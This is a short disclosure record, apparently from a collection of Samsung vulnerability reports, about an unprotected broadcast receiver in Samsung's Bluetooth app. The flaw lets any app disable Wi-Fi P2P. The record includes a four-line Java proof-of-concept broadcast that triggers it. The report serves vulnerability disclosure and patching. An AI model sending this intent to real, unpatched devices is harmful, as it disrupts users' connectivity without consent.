# Details

<table>
    <tr>
        <td>Name</td>
        <td>Bluetooth</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.android.bluetooth</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.11</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/107.%20Bluetooth%20—%20Disabling%20Wi-Fi%20P2P/Oversecured_report.png)

The Bluetooth app has been patched by Samsung. In the file `com/samsung/bt/bluetoothcast/mcm/BluetoothAudioCastService.java` they added an unprotected receiver registration which handles the `com.samsung.android.bluetooth.mcf.cast.action.WIFI_SERVICE_DISABLE_RESPONSE` action. If the attacker provides `com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_DISABLE_RESPONSE` set to 1 and `com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_NAME` set to 4, the app will disable Wi-Fi P2P.

**Proof of Concept**

```java
Intent i = new Intent("com.samsung.android.bluetooth.mcf.cast.action.WIFI_SERVICE_DISABLE_RESPONSE");
i.putExtra("com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_DISABLE_RESPONSE", 1);
i.putExtra("com.samsung.android.bluetooth.mcf.cast.extra.WIFI_SERVICE_NAME", 4);
sendBroadcast(i);
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
